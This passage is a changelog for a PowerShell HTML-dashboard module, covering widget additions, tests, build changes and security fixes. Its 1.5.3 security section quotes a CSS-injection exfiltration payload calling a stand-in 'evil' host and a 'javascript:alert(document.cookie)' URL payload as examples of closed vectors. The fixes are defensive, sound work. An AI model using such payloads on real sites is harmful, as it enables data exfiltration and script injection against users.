- **All shipped `Examples/*.ps1` pass `-AllowHtml:$true` on their intentional raw-HTML calls** — the library's own examples are warning-free and model the forward-compatible pattern users should copy. Committed `Examples/*.html` regenerated at 1.6.0.

### Migration note
Nothing breaks on upgrade to 1.6.0. If you pass HTML into any of the four sinks you will now see a one-line deprecation warning per affected call. Two ways to resolve it, per call:
- **Trusted / intentional HTML** (you built the markup) → add `-AllowHtml:$true`.
- **Untrusted / external data** (you interpolated a value from somewhere) → add `-AllowHtml:$false` to encode it. This is the safer choice and will become the default in 2.0.0.

## [1.5.4] — 2026-07-18

Housekeeping / developer-experience release. **No runtime behaviour change** for generated dashboards — every change is in the build, tests, examples, and docs.

### Added
- **PSScriptAnalyzer gate in `Build.ps1`** — new step 3 runs `Invoke-ScriptAnalyzer` against the module source, fails the build on any **Error**-severity finding, and reports Warnings non-fatally. Rule exclusions live in the new `PSScriptAnalyzerSettings.psd1`, each with a documented rationale (BOM rule waived for a UTF-8/PS7 module; `PSReviewUnusedParameter` waived for the required `param($m)` in `[regex]::Replace` MatchEvaluators; `PSUseSingularNouns` waived for genuinely-plural cmdlets like `Add-DhTabs`; `PSUseShouldProcess` waived for the in-memory `New-DhDashboard` / `Set-DhTableLink`). Baseline is clean (0 errors, 0 warnings). New `-SkipLint` switch for rapid local iteration.
- **Examples smoke test in the Pester suite** — a new `Describe` runs every `Examples/*.ps1` in its own `pwsh` subprocess (avoiding the multi-module-load collision that affects `InModuleScope`) and asserts exit 0, a `<!DOCTYPE html>` … `</html>` envelope, a plausible size, and that no `/*%%…%%*/` config placeholder survived unsubstituted. **330 tests total** (was 324).

### Changed
- **All five `Examples/*.ps1` normalised to a common parameter contract** — `-OutputPath` (defaults beside the script) and `-OpenInBrowser` (defaults `$false`). Previously `AD-Dashboard.ps1`, `Multi-Panel-Dashboard.ps1`, and `vSphere-Dashboard.ps1` had **no `param()` block and hard-coded `-OpenInBrowser`**, so every run popped a browser window and they couldn't be driven non-interactively (by the smoke test or by scripted regeneration).
- **Regenerated `Examples/*.html`** — the committed example dashboards were stale (dated 2026-05-25, v1.5.0). They now reflect 1.5.1 collapsible chrome, 1.5.2 topology auto-fit + hover tooltips, and 1.5.3 SRI-pinned CDN scripts. All five carry the `v1.5.4` generator tag.
- **`Build.ps1` stages `README.md` + `LICENSE`** into `dist/DashHtml/` so `Publish-*` ships them (fixes the "package is missing a readme" warning and lets the license travel as a file).

### Security
- **Removed a plaintext PSGallery API key** from `PublishPowerShellGallery.txt` (it was committed in a cloud-synced folder). The file is now a runbook with three safe key-handling patterns (interactive prompt / SecretManagement vault / CI env var). **The previously-committed key must be rotated and treated as compromised.**
- **Publish runbook modernised to `Publish-PSResource`** — eliminates the `dotnet pack` NU5110/NU5111/NU1903 warning noise, picks up `README.md` as the package readme, and ships `LICENSE` as `<license type="file">` instead of the deprecated `<licenseUrl>`.

## [1.5.3] — 2026-06-20

Security hardening. Closes three concrete vectors flagged in the v1.5.2 audit. **No breaking changes** for any caller passing well-formed colours and URLs.

### Security
- **CSS injection via colour fields — closed.** `Add-DhPieChart` slice `Color` and `Add-DhLineChart` series `Color` are now validated through `Test-DhSafeCssColor` against a fixed allowlist (`#hex` 3/4/6/8 digit, `rgb()`/`rgba()`, `hsl()`/`hsla()`, `var(--token)`, single CSS named colour). Previously these strings were HTML-encoded but reached the inline `style="background: …"` markup with CSS metacharacters (`;`, `:`, `(`, `)`) intact, so a caller piping untrusted data into a colour could inject arbitrary CSS rules — including `background-image: url(http://evil/log?u=PII)` for data exfiltration.
- **`javascript:` URL execution via Action.Url — closed.** `Add-DhAlertBanner -Action @{Url=…}` and `Add-DhSummary` tile `Action.Url` are now validated through `Test-DhSafeActionUrl`. Allowed schemes are `http:`, `https:`, `mailto:`, `tel:`, and a leading `#` (in-page anchor). Anything else throws at declaration time, preventing `javascript:alert(document.cookie)`-style payloads from reaching `window.open()` in the dashboard origin.
- **CDN supply-chain attack — closed.** The three `<script>` tags loaded from cdnjs (`xlsx`, `jspdf`, `jspdf-autotable`) now carry SRI `integrity="sha384-…"` attributes pinned to the bundled library versions. A compromised CDN or HTTPS-MITM proxy can no longer swap the script body — the browser refuses to execute a tampered file. `referrerpolicy="no-referrer"` also added so the user's dashboard path isn't leaked to cdnjs on each load.

### Changed
- **`ConvertTo-DhJsonString` now escapes U+2028 / U+2029** as their explicit ` ` / ` ` JSON sequence. Modern JS engines accept these inside string literals (ES2019+), but older parsers, linters, and log forwarders treat them as raw line terminators and could break the embedded `<script>` block when a label value happened to contain one.
- **Help text on `Add-DhTabs`, `Add-DhAlertBanner`, and `Add-DhCollapsible`** now carries the same explicit SECURITY note that `Add-DhHtmlBlock` already had, spelling out the raw-HTML / never-pass-untrusted-data contract. The four cmdlets behaved identically in 1.5.2 — only `Add-DhHtmlBlock` was documented as such. Callers piping `$user.Description` into `-Message`, `-Content`, or per-tab `Content` should now see the warning at `Get-Help` time.

### Implementation
- `Private/Test-DhSafeInput.ps1` (new) — exposes `Test-DhSafeCssColor` and `Test-DhSafeActionUrl`. Both throw on invalid input with a deterministic, descriptive message including the caller context. Auto-imported by the existing `Private/*.ps1` loader in `DashHtml.psm1`.
- `Public/Add-DhPieChart.ps1`, `Public/Add-DhLineChart.ps1` — slice/series `Color` normalisation pipeline now routes through `Test-DhSafeCssColor`.
- `Public/Add-DhAlertBanner.ps1`, `Public/Add-DhSummary.ps1` — `Action.Url` normalisation routes through `Test-DhSafeActionUrl` before the normalised hashtable is built.
- `Public/Export-DhDashboard.ps1` — `<script>` tags for cdnjs scripts now include `integrity=` (computed against the exact bundled versions) and `referrerpolicy="no-referrer"`.
- `Private/ConvertTo-DhJsonString.ps1` — final pass appends ` ` / ` ` escaping.

### Tests
- **14 new Pester scenarios** under five `Security:` Describe blocks. 322 tests total (was 308). New tests cover: PieChart Color allowlist (positive & negative cases including a literal CSS-injection payload), LineChart Color allowlist, AlertBanner `Action.Url` scheme allowlist (rejects `javascript:` and `data:`, accepts http/https/mailto/tel/#), Summary tile Action URL, `ConvertTo-DhJsonString` U+2028/U+2029 escape round-trip, and an end-to-end check that the generated HTML carries `integrity="sha384-…"` on all three CDN script tags.

## [1.5.2] — 2026-06-19

Topology map usability pass. Fully backward compatible; the new behaviour is opt-in via `-AutoFitWidth` on `Add-DhTopologyMap`, but the styled hover tooltip is on by default for every topology block (it replaces the OS-default `title` attribute that was already in use).

### Added
- **`-AutoFitWidth` switch + `-AutoFitMaxWidth` parameter on `Add-DhTopologyMap`** — when set, the JS renderer measures the widest label / icon / badge combination across all nodes using a hidden canvas and grows `NodeWidth` to fit, capped at `-AutoFitMaxWidth` (default 360 px). Removes the truncated-FQDN problem that hits wide-fan trees rendered at the 140 px default.
- **Styled hover tooltip on every topology node** — a single body-level overlay positioned via JS surfaces either the explicit `Tooltip` (when supplied) or the node's full `Label` as a fallback. Replaces the OS-default tooltip, which was both slow to appear and unstyled. Works on SVG node groups (CSS `::after` / `::before` do not render on SVG elements, hence the body-level overlay approach).

### Implementation
- `Public/Add-DhTopologyMap.ps1` — new `[switch] $AutoFitWidth` and `[ValidateRange(140,600)] [int] $AutoFitMaxWidth = 360` parameters; both emitted in the block hashtable.
- `Public/Export-DhDashboard.ps1` — `topologymap` JSON now carries `autoFitWidth` and `autoFitMaxWidth`.
- `Private/Get-DhJsContent.ps1` — new `_topoMeasureText()` (lazy `<canvas>` instance), `_topoEnsureTooltip()` / `_topoShowTooltip()` / `_topoHideTooltip()` helpers. `renderTopologyMap()` runs the auto-fit pass on the global node set before layout (per-node would break the parent-centring maths) and wires `mouseenter` / `mousemove` / `mouseleave` / `focusin` / `focusout` on every `.topo-node`.
- `Private/Get-DhCssBase.ps1` — new `.topo-tooltip` rule (fixed position, themed via existing tokens).

## [1.5.1] — 2026-06-19

Collapsible chrome now available on every block cmdlet (and on `Add-DhTable` and `Add-DhAlertBanner`), matching the `Add-DhSummary` pattern introduced in 1.3.2. Fully backward compatible at the parameter level; **default is `$true` per cmdlet so existing dashboards immediately gain folding headers**. Pass `-Collapsible:$false` per call to keep the flat 1.5.0 look.

### Added
- **`-Collapsible` and `-DefaultOpen` parameters on every block cmdlet** — `Add-DhBarChart`, `Add-DhBullet`, `Add-DhEventFeed`, `Add-DhFilterCard`, `Add-DhHeatmap`, `Add-DhHtmlBlock`, `Add-DhLineChart`, `Add-DhPieChart`, `Add-DhStatusGrid`, `Add-DhTabs`, `Add-DhTopologyMap`. Both default to `$true`. When enabled, the block's outer container becomes a `.collapsible-section` with a clickable header bar (chevron + click-to-toggle) using the same chrome as `Add-DhCollapsible` / `Add-DhSummary`. The inner renderer is unchanged — a new central JS helper `wrapCollapsibleBlock()` rewrites the host container before dispatch and strips the inner block's `title`/`icon` so they don't render twice.
- **`-Collapsible`, `-DefaultOpen`, `-Icon` on `Add-DhTable`** — the existing `<section class="table-section">` now optionally hosts a clickable `<button class="table-section-toggle">` header above a foldable `.table-section-body` that wraps the toolbar, table, paging, and link badge. The outer `<section>` stays as the nav target so `showSubPanel()` routing is unaffected. The new `-Icon` parameter places an optional glyph next to the table title.
- **`-Collapsible`, `-DefaultOpen`, `-Title` on `Add-DhAlertBanner`** — the banner gains a clickable header bar that folds the message body. Action + dismiss buttons stay outside the collapse so they remain reachable when the body is closed. `-Title` defaults to a severity-derived label (`'Alert'` / `'Notice'` / `'Warning'` / `'Critical'`).

### Changed
- **Default rendering is now collapsible** — this is a visible behaviour change for every existing dashboard. If a customer needs the pre-1.5.1 flat look, add `-Collapsible:$false` on each affected call. Tested against the existing 308 Pester scenarios; all pass with the new default.

### Implementation
- `Get-DhJsContent.ps1` — new `wrapCollapsibleBlock(outer, block)` helper and a refactored `renderBlocks()` central dispatcher. Block types that already own their own chrome (`'collapsible'`, `'summarystrip'`) are passed through unwrapped via a `_SELF_COLLAPSIBLE` lookup. New `initTableCollapsibles()` runs once at DOMContentLoaded to wire `.table-section-toggle` click handlers. `renderAlerts()` grows a `if (alert.collapsible) {…}` branch for the banner-specific wrap.
- `Build-DhTableSections.ps1` — emits `<button class="table-section-toggle">` + `<div class="table-section-body">` wrappers when the table opted in.
- `Get-DhCssBase.ps1` — new `.table-section-toggle` / `.table-section-body` / `.table-section-chevron` rules and `.alert-banner-collapsible` rules for the per-banner wrap.
- `Export-DhDashboard.ps1` — single shared `$bCollStr` / `$bDoStr` pair computed once per block; appended to every block-emit line in the `switch ($b.BlockType)` (11 cases). Banner emit grows three new keys (`collapsible`, `defaultOpen`, `title`).

## [1.5.0] — 2026-05-25

Tier A widget expansion: inline tabbed content, 2-D heatmaps, and parent-child topology trees. Closes out the three remaining spec widgets from the v1.4 plan (`docs/v1.4-plan.md`). Fully backward compatible.

### Added
- **`Add-DhTabs` cmdlet** — inline tabbed content block. Local pivot within one section of the dashboard flow; distinct from `NavGroup` which partitions the whole page. Each tab is a `@{Title; Content; Icon?; Active?}` hashtable; `Content` is raw HTML following the same policy as `Add-DhHtmlBlock`. First tab auto-marks active when none specifies `Active=$true`. Full W3C accessibility pattern: `role="tablist" / "tab" / "tabpanel"`, `aria-selected`, `aria-controls`, arrow-key navigation between tabs, and a `focus-visible` outline.
- **`Add-DhHeatmap` cmdlet** — `Rows × Columns` matrix with a numeric colour scale. Distinct from `Add-DhStatusGrid` which is categorical RAG; the heatmap interpolates between two CSS-themed colours. `-ColorScale 'sequential'` (default — chart-1 → chart-2) or `'diverging'` (chart-1 → border-subtle → chart-3, centred on a midpoint). `-Min` / `-Max` auto-fit from the supplied cell values when omitted. `-Unit` suffixes the cell readout when `-ShowValues` is set. `-CellSize 'small'` / `'normal'` / `'large'`. Hard ceiling at `-MaxCells` (default 5000) with a soft warning above 1000 cells.
- **`Add-DhTopologyMap` cmdlet** — parent-child tree visualisation for hierarchies (AD Forest → Domain → DC, vCenter → Cluster → Host, network device chains, etc.). Each node is `@{Id; Label; Parent?; Status?; Icon?; Badge?; Tooltip?; LinkTableId?; LinkFilter?}`. Recursive subtree-width layout — simple tidy SVG tree, no force-directed graphs. `-Direction 'vertical'` (parent above children, default) or `'horizontal'` (parent left of children). `-NodeWidth` / `-NodeHeight` per-node dimensions. Cycle detection rejects loops; missing parents throw. Clickable nodes (`LinkTableId` set) navigate to a registered table with optional pre-filter, reusing the same machinery as `Add-DhStatusGrid` cells and `Add-DhAlertBanner -Action`. Status colouring reuses the cell-`ok` / `warn` / `danger` / `nodata` palette so trees inherit the active theme.

### Tests
- 26 new Pester tests (5 for Tabs, 7 for Heatmap, 14 for TopologyMap). Suite total: **308** (up from 282 at 1.4.2).

## [1.4.2] — 2026-05-25

### Added
- **`Add-DhAlertBanner` — `-NavGroup` / `-NavSubGroup`**: banners can now bind to a specific nav panel instead of being page-global. Without the params, behaviour is unchanged from 1.4.x (banner shows on every panel). New CSS rule `.alert-banner[data-navgroup]:not(.panel-active) { display: none; }` keeps grouped banners hidden until their tab is active.
- **`Add-DhSummary` — per-tile `Action` (click-to-jump)**: optional `Action=@{TableId?; Filter?; Url?; Label?}` hashtable on any tile (any style: tile / bignumber / gauge) makes the whole tile clickable. Mirrors the `Add-DhAlertBanner -Action` shape — provide either `TableId` (jump to a registered table, with optional `Filter` pre-applied) or `Url` (open in a new tab). Validation: exactly one of TableId / Url is required. Keyboard accessible (Enter / Space). Adds `.tile-clickable` CSS with focus-visible outline.
- **`New-DhDashboard` — `-AutoRefresh`**: optional duration string (`'30s'`, `'5m'`, `'1h'`, or plain seconds) that emits a `<meta http-equiv="refresh">` tag in `<head>`. Useful for wall-display ops dashboards. Omit / pass `''` to disable (default).
- **Native hover tooltips** on pie slices and bar-chart bars — shows the label / count / percentage on hover via the browser-native `title=""` attribute. No JS library, zero overhead. For pies it's a nested `<title>` SVG element; for bars it's a `title` attribute on `.bar-item`.

### Tests
- 16 new Pester tests (4 for NavGroup banners, 6 for tile Action, 6 for AutoRefresh). Suite total: **282** (up from 266).

## [1.4.1] — 2026-05-25

### Added
- **`Add-DhSummary` — per-NavGroup KPI strips**: new `-NavGroup` / `-NavSubGroup` / `-Id` parameters. When `-NavGroup` is set, the strip lives in the per-panel block flow (visible only when its nav group is active); without `-NavGroup`, the legacy top-of-page singleton behaviour is preserved. Multiple per-group strips coexist with one global strip — each panel in a two-tier nav can have its own KPI hero row. `-Id` auto-derives from the NavGroup name (slugified) when omitted. Duplicate-Id guard prevents accidentally clobbering a strip when the same NavGroup is supplied twice.
- **New JS block type `'summarystrip'`** with a top-level `renderSummaryStrip(container, block)` renderer that reuses every existing tile helper (standard / bignumber / gauge / sparkline / delta).
- **New example `Examples/Multi-Panel-Dashboard.ps1`** — focused showcase of the multi-summary feature with three nav groups (Identity / Infrastructure / Finance), each with its own KPI strip + matching content.
- **Moved** `Invoke-Demo-DashHtml.ps1` from the repo root to `Examples/` and refreshed it to exercise the full v1.4 widget set (banner, gauge, bignumber, bullet, line, pie, status grid, event feed, sparkline cells, per-group summary). The `-Theme` ValidateSet now includes `Rag`. Stale `Demo-DashHtml-*.html` outputs at the repo root removed.

### Fixed
- **JS helper hoisting (latent ReferenceError)**: `pickThresholdClass`, `classToAccent`, `classToAccentBg`, and the tile-builder helpers (`buildTile`, `buildStandardTile`, `buildBignumberTile`, `buildGaugeTile`, `tileFormatValue`, `tileDeltaHtml`, `tileSparklineHtml`) were nested inside `renderSummary()` but called by `buildBulletRow` and `renderLineChart` from module scope. Under strict-mode JS, nested function declarations don't leak — those calls would have thrown `ReferenceError` in a browser. The Pester tests pattern-match emitted HTML text rather than executing the JS, so the regression slipped through. All helpers are now at module scope and reused identically by `renderSummary`, `renderSummaryStrip`, `renderBullet`, and `renderLineChart`.

### Tests
- 9 new tests covering per-group summary storage, NavGroup → block dispatch, auto-Id slugification, NavSubGroup carry-through, multiple-strip coexistence, duplicate-Id throw, legacy backward-compat, and full HTML round-trip with `renderSummaryStrip` + `data-navgroup` attribute. Suite total: **266 tests**, all passing.

## [1.4.0] — 2026-05-23

### Theme
**KPI & Dashboard Primitives.** Major widget expansion driven by the IT-infrastructure KPI dashboard specification (`docs/KPI_Dashboard_Specification.docx`, see also `docs/v1.4-plan.md`). 13 of 16 spec widgets now ship as first-class cmdlets. Tile sparklines, trend deltas, gauge + big-number variants, line / area / bullet / pie charts, status matrix, event feed, alert banner, and a unified `-Rag` parameter shape that finally aligns the threshold model with the Office/Excel RAG palette via the new `Rag` theme family. **Fully backward compatible** — every pre-v1.4 dashboard renders identically. **257 Pester tests pass** (up from 116 at the start of v1.4 work).

### Added
- **`Add-DhAlertBanner` cmdlet** — new top-of-page alert strip rendered above the KPI summary tiles. First feature landed from the v1.4 "KPI & Dashboard Primitives" scope (see [`docs/v1.4-plan.md`](docs/v1.4-plan.md), Feature F6). Supports four severity levels (`info` / `ok` / `warning` / `critical`) mapped onto the existing `cell-ok` / `cell-warn` / `cell-danger` palette so colours follow the active theme. Optional `-Dismissible` switch adds a close button with dismissal state persisted in the URL hash (survives page reload, resets in a new browser session). Optional `-Action` parameter adds a button that either navigates to a registered table (with optional pre-filter text) or opens an external URL. Multiple banners stack in declaration order. Distinct from `Add-DhCollapsible` (which is in-content) and from the planned `Add-DhEventFeed` (which is a chronological log). 15 new Pester tests bring the suite to 131.
- **`Add-DhPieChart` cmdlet** — standalone pie / donut chart as a first-class block (v1.4 plan Feature F7). Two data modes: **Mode A** derives counts from a registered table column (with `-TopN` cap and optional `-ClickFilters` for click-to-filter on the source table); **Mode B** takes explicit `-Slices @(@{ Label; Value; Color })` for non-tabular data (cost breakdowns, weighted distributions). `-Style` chooses between `'donut'` (default — total shown in centre hole) and `'pie'` (solid disc). Per-slice custom colours via the optional `Color` key in Mode B. Reuses the existing chart palette (`--chart-1`..`--chart-8`). 17 new Pester tests bring the suite to 148.
- **`Add-DhSummary` — tile sparklines** (v1.4 plan Feature F2). Each tile hashtable can carry an inline mini-chart via four new optional keys: `Sparkline` (numeric array — non-numeric items are dropped with a warning), `SparklineStyle` (`'line'` default / `'area'` / `'bars'`), `SparklineMin` / `SparklineMax` (optional fixed Y-axis bounds). Pure SVG, ~120×24 px, uses the active theme's `--chart-1` accent. New top-level `SPARK.build()` JS helper — reusable by the planned sparkline table cell type (F8) — sits alongside the existing `chartPalette()` / `buildPieSvg()` helpers. Works in both flat and collapsible summary variants. 10 new Pester tests bring the suite to 158.
- **`Add-DhStatusGrid` cmdlet** — rows × columns RAG status matrix (v1.4 plan Feature F5 — the "Status Matrix / Health Grid" widget called out in the IT-infrastructure KPI dashboard specification §2). Use for binary or low-cardinality state across many entities: services × regions, DCs × replication links, hosts × probes. Per-cell keys: `Row` + `Column` (must appear in the `-Rows` / `-Columns` axes — typos throw), `Status` (`'ok'` / `'warn'` / `'danger'` / `'nodata'` / `'info'`), optional `Tooltip` (native `title=""` hover), optional `LinkTableId` + `LinkFilter` (clicking the cell navigates to the named table and applies the filter, reusing the same hook as `Add-DhAlertBanner -Action`). Cmdlet params: `-RowLabel` / `-ColumnLabel` (axis captions in the top-left corner), `-CellSize` (`'small'` 32px / `'normal'` 48px default / `'large'` 64px), `-MaxCells` (hard ceiling, default 2000 — a soft warning fires above 200 cells). Cells you don't declare render as a faint dashed neutral state. Auto-generated legend strip below the grid shows the statuses actually present. Responsive: below 600px viewport the grid collapses to a stacked list with coloured stripes per row. 11 new Pester tests bring the suite to **257**. **This is the last feature on the v1.4 roadmap** (`docs/v1.4-plan.md`).
- **`Add-DhEventFeed` cmdlet** — chronological severity-tagged event list (v1.4 plan Feature F11). The canonical "Row 5" of the IT-infrastructure KPI dashboard specification (§4.1 AD layout, §4.2 vSphere layout) — the audit trail that pairs with the at-a-glance KPI tiles above. **Distinct from `Add-DhAlertBanner`** (banner = single current condition rendered above the summary; event feed = chronological history rendered as an inline block). Per-event keys: `Timestamp` + `Severity` + `Message` required, `Source` and `Icon` optional. Severities `info` / `ok` / `warning` / `critical` reuse the existing RAG palette. Cmdlet params: `-MaxItems` (default 50, range 1..1000), `-GroupBy` (`'None'` default / `'Severity'` / `'Source'` — when grouped, `'Severity'` orders critical → warning → ok → info, `'Source'` is alphabetical), `-SortDescending` (default `$true`). Pure DOM/list rendering — no SVG, no library. 12 new Pester tests bring the suite to 246.
- **Sparkline cell type on `Add-DhTable` columns** (v1.4 plan Feature F8). New `CellType='sparkline'` value renders each row's array as an inline mini-chart inside the cell — same SVG (`SPARK.build`) used by tile sparklines (F2), so the visual language stays consistent across the dashboard. Column-level keys: `SortBy` (`'last'` default / `'avg'` / `'max'` / `'min'` / `'sum'` — how clicking the header sorts rows by reducing each row's array to a comparable scalar) and `SparklineStyle` (`'line'` default / `'area'` / `'bars'`). Threshold colouring and per-cell `Format` are skipped for sparkline columns since the value is an array, not a scalar. Null / missing values render as a muted em-dash. Row JSON emitter extended to preserve array values as JSON arrays (was previously stringified). Existing 'text' / 'progressbar' / 'badge' cell types are now also explicitly validated by a ValidateSet — unknown CellType values throw. 6 new Pester tests bring the suite to 234.
- **`Add-DhBarChart` — `-Stacked` + `-SeriesField`** (v1.4 plan Feature F12). New optional switch + companion parameter on the existing cmdlet for "primary aggregation by `-Field`, segmented by `-SeriesField`" breakdowns (resource breakdowns, error-type distributions per the spec §2). Series colours pulled from the active theme's `--chart-1..8` palette and assigned in alphabetical order of the seriesField values so the legend stays stable across renders. Each primary bar is sized by total count (same scale as single-series), with internal flex segments proportional to each series value's share of THAT bar. Click-to-filter (`-ClickFilters`) is intentionally a single-series-only feature — stacked bars have no single value to filter by; passing both is a no-op. Convenience: supplying `-SeriesField` alone auto-stacks (you don't *also* need `-Stacked`). Validation: `-Stacked` requires `-SeriesField`; `-SeriesField` must differ from `-Field`. **Backward compatible** — single-series calls unchanged. New JS `renderBarChartStacked` branch + `.bar-track-stacked` / `.bar-segment` / `.bar-chart-legend` CSS. 6 new Pester tests bring the suite to 228.
- **`Add-DhLineChart` cmdlet** — time-series line / area chart with axes, multi-series support, and an optional dashed target / threshold annotation line (v1.4 plan Feature F9 — the biggest single gap per the IT-infrastructure KPI dashboard specification §7.4: *"Always pair a time-series chart with a threshold annotation line."*). Parameters: `-XAxis` (string-array category labels), `-Series` (array of `@{Label;Values[];Class;Color}` — `Class` maps to the RAG palette, `Color` is an explicit override, `Values` must match `XAxis` length, `$null` entries are allowed as line breaks), `-Filled` (area variant), `-TargetLine` + `-TargetLabel`, `-YAxisMin` / `-YAxisMax` / `-YAxisUnit`, `-ShowLegend` / `-ShowGrid` (defaults `$true`), `-Height` (80–1000, default 240). Pure SVG, no library dependency — 800×Height viewBox stretches horizontally to fit the container; Y-axis auto-fits from the data with 5% padding when bounds are omitted. Threshold line auto-extends the visible Y range so it never clips. 14 new Pester tests bring the suite to 222.
- **`Add-DhBullet` cmdlet** — bullet chart for actual-vs-target with RAG performance bands (v1.4 plan Feature F10). The canonical visualisation called out in the IT-infrastructure KPI dashboard specification (§2) for SLA latency, CPU/memory headroom, overcommit ratios, etc. `-Items` accepts an array of bullet specs; each renders as one horizontal row stacked vertically inside the block. Per-item keys: `Label`, `Value` (numeric), optional `Target`, `Min` / `Max` (default 0..100), `Unit` (readout suffix), `Class` (value-bar colour override), plus either modern `Rag` (unified shape from F13) or legacy `Thresholds` / `Bands` arrays (`Bands` is a documented alias). First consumer of the F13 `-Rag` shape — bullets pair naturally with `Add-DhSummary -Style 'gauge'` tiles (gauge = compact at-a-glance, bullet = detailed per-entity row). Pure SVG renderer (new `renderBullet` + `buildBulletRow` + `classToAccentBg` helper, all reusing the existing `pickThresholdClass` / `classToAccent`). 12 new Pester tests bring the suite to 208.
- **Unified `-Rag` parameter shape on `Add-DhSummary` items and `Add-DhTable` columns** (v1.4 plan Feature F13 cmdlet wiring). Replaces or supplements the existing `Thresholds=@(@{Min;Max;Class})` shape with a more readable mapping: `@{ Green=@{Max=70}; Amber=@{Min=70;Max=90}; Red=@{Min=90}; NoData=$true }`. Bound to `cell-ok` / `cell-warn` / `cell-danger` automatically. `NoData=$true` is the opt-in that lets a gauge accept `Value=$null` (painted `cell-nodata` at render) and lets table columns colour null / missing cells with `cell-nodata` instead of leaving them blank. Both `-Rag` and the legacy `Thresholds=` shape can be supplied on the same item / column — `Rag` wins. Unknown top-level or band-level keys throw, so typos surface as errors. New private `ConvertTo-DhRagThresholds` normaliser; new `ragNoData` flag on column and gauge JSON; new JS branch in `getThresholdClass` and `buildGaugeTile`. 11 new Pester tests bring the suite to 196.
- **New `Rag` theme family + fourth `cell-nodata` RAG state across all themes** (v1.4 plan Feature F13 palette work). `New-DhDashboard -Theme Rag` selects a new sixth family that uses the IT-infrastructure KPI dashboard specification's exact Office/Excel RAG palette (§7.2): GREEN `#375623 / #E2EFDA`, AMBER `#7F4B00 / #FFF2CC`, RED `#9C0006 / #FFDCE1`, GREY `#595959 / #F2F2F2`. The dark variant uses Office dark-mode RAG companions (`#A9D08E` / `#FFD966` / `#FF7E7E` / `#A6A6A6`). For users who need strict spreadsheet parity (compliance, audit, finance reports) without retuning brand-aligned shades in the other five families. Every theme — including the original five — now also defines a new `--cell-nodata-fg` / `--cell-nodata-bg` token pair so missing / unmeasured / collection-failed values render visually distinct from `0` or `OK`. Available everywhere existing RAG classes worked: table cell thresholds (`Class='cell-nodata'`), summary tile `Class`, html-block `-Style 'nodata'`, collapsible card `BadgeClass`, plus the `badge-nodata` / `fill-nodata` / `row-hl-nodata` modifiers. Backward compatible — the existing five themes keep their brand-aligned GREEN/AMBER/RED values unchanged; only the new no-data state is added on top. 3 new theme tests + updated cross-family coverage bring the suite to 185.
- **`Add-DhSummary` — tile styles: `bignumber` and `gauge`** (v1.4 plan Features F3 + F4). New per-item `Style` key dispatches between three renderers: `'tile'` (default — unchanged), `'bignumber'` (full-width hero tile, 2.4–3.6 rem value typography, optional `Caption` line), `'gauge'` (140×80 semicircle SVG with background arc and threshold-coloured filled arc). Gauge accepts `Min` / `Max` / `Unit` and `Thresholds=@(@{ Min=...; Max=...; Class='cell-...' })` using the same shape as `Add-DhTable` column thresholds — with "highest matching Min wins" semantics so the spec-friendly Min-only pattern is supported. New top-level JS helpers `pickThresholdClass()` and `classToAccent()`. 10 new Pester tests bring the suite to 182.
- **`Add-DhSummary` — trend & delta indicators** (v1.4 plan Feature F1). Each tile hashtable can carry four new optional keys: `Previous` (baseline value — when supplied, the arrow direction and delta are auto-derived), `Trend` (`'auto'` default / `'up'` / `'down'` / `'flat'` — explicit override or use without a numeric baseline), `TrendIsGood` (nullable bool to flip the colour semantics for "lower is better" metrics like error counts or latency), `DeltaFormat` (`'both'` default / `'percent'` / `'absolute'`). Renders a compact `▲ +12 (+5.5%)` line between the value and the label, coloured via the active theme's RAG palette tokens (`--cell-ok-fg` / `--cell-danger-fg` / `--text-muted`). New top-level `DELTA.build()` JS helper. Handles `Previous=0` (no percent), zero-delta (`±0`), and explicit-Trend-without-Previous (arrow alone) gracefully. 14 new Pester tests bring the suite to 172.

### Fixed
- **Locale-sensitive `[double]::TryParse` calls in v1.4 normalisers** — `Previous`, `SparklineMin`, `SparklineMax`, individual `Sparkline` array elements, and `Add-DhPieChart` slice `Value` are now parsed with `InvariantCulture` instead of `CurrentCulture`. The previous behaviour silently corrupted decimals on locales like `it-IT` where the period is a thousands separator (`Previous=92330.25` became `9233025`). PowerShell's `[string]` cast on a double already uses invariant format, so the parse must match. Regression test added.

### Changed
- **JS chart renderer refactor (internal)** — extracted shared `chartPalette()` and `buildPieSvg()` helpers in the embedded JS so the new `Add-DhPieChart` block and the pre-existing per-table chart (`Add-DhTable -Charts`) render identically. The per-table `_buildPieChart` now delegates to `buildPieSvg`. No visible change for existing dashboards — verified by the 131-test pre-refactor suite passing unchanged.

### Documentation
- **README — multiple new sections**: Tile styles, Trend and delta indicators, Inline sparklines on tiles, Alert banners, Pie / Donut charts, Bullet charts, Line / Area charts, Event feed, Status Grid, Sparkline cells, Unified `-Rag` parameter, `Rag` theme + `cell-nodata` state, Declaration order. Plus two example scripts (`Examples/AD-Dashboard.ps1`, `Examples/vSphere-Dashboard.ps1`) mirroring the spec's §4.1 and §4.2 reference layouts.
- **`docs/v1.4-plan.md` + `docs/KPI_Dashboard_Specification.docx`** — the v1.4 design plan and the IT-infrastructure KPI dashboard spec that drove this release are now in the repo for posterity.

## [1.3.3] — 2026-05-19

### Fixed
- **Three-tier nav — `-NavSubGroup` now binds blocks to a subgroup**: Previously, when a group containing subgroups was opened, the subgroup pill strip was rendered but **no pill was active**, so all blocks tagged with `-NavSubGroup` were shown together. The pill only filtered them after the user clicked one. This made `-NavSubGroup` on `Add-DhHtmlBlock` (and the other block cmdlets) effectively an opt-in filter rather than a binding.
  - `showGroup()` in `Get-DhJsContent.ps1` now auto-activates the first pill of the entered group via `showSubGroup()`. As a result, items tagged with `-NavSubGroup` are visible only when their pill is active. Items in the group **without** `-NavSubGroup` remain visible regardless of the active pill, as documented.
  - No script changes required — existing two-tier scripts (no `-NavSubGroup` anywhere) are unaffected because no pills are emitted.

## [1.3.2] — 2026-05-15

### Added
- **`Add-DhSummary` — collapsible KPI strip**: The KPI tile strip is now wrapped in a collapsible container that mirrors the look & feel of `Add-DhCollapsible`, with a header badge showing the tile count. Three companion parameters let you customise the header: `-Title` (defaults to `'Summary'`), `-Icon` (optional emoji / unicode glyph), and `-DefaultOpen` (defaults to `$true`). Collapsibility is **on by default** — existing scripts get the new look with no code changes. Pass `-Collapsible:$false` to revert to the flat pre-1.3.2 tile strip.

### Changed
- **`Add-DhSummary` — default rendering**: The default rendering now includes a collapsible header above the tile strip. This is a visible behaviour change for existing scripts; if you prefer the flat strip with no header, add `-Collapsible:$false`.

### Documentation
